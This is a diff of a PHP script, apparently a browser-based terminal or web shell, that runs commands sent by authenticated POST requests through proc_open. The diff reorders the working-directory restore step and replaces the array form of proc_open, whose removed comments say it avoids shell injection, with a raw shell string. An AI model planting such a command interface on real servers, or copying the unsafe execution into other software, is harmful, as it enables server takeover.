@@ -147,10 +147,13 @@ if ($authenticated && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['act
         echo json_encode(['output' => '', 'cwd' => getcwd()]);
         exit;
     }
+    // Khôi phục thư mục làm việc trước khi xử lý lệnh và cd
+    if (!empty($_SESSION['cwd']) && is_dir($_SESSION['cwd'])) {
+        chdir($_SESSION['cwd']);
+    }
     // Xử lý lệnh cd
     if (preg_match('/^\s*cd\s+(.*)/i', $cmd, $matches)) {
         $dir = trim($matches[1]);
-        $dir = stripslashes($dir);
         if (empty($dir) || $dir === '~') {
             $dir = PHP_OS_FAMILY === 'Windows' ? (getenv('USERPROFILE') ?: 'C:\\') : (getenv('HOME') ?: '/');
         }
@@ -162,23 +165,12 @@ if ($authenticated && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['act
         }
         exit;
     }
-    // Khôi phục thư mục làm việc
-    if (!empty($_SESSION['cwd']) && is_dir($_SESSION['cwd'])) {
-        chdir($_SESSION['cwd']);
-    }
     $cwd = getcwd();
     // Thực thi lệnh
-    // Windows: truyền cmd qua array để tránh shell injection
-    if (PHP_OS_FAMILY === 'Windows') {
-        $cmd_array = ['cmd', '/c', $cmd];
-    } else {
-        $cmd_array = ['bash', '-c', $cmd];
-    }
     $output = '';
     if (function_exists('proc_open')) {
         $descriptorspec = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
-        // Dùng array thay string để tránh shell injection
-        $proc = proc_open($cmd_array, $descriptorspec, $pipes, $cwd);
+        $proc = proc_open($cmd, $descriptorspec, $pipes, $cwd);
         if (is_resource($proc)) {
             fclose($pipes[0]);
             $output = stream_get_contents($pipes[1]);
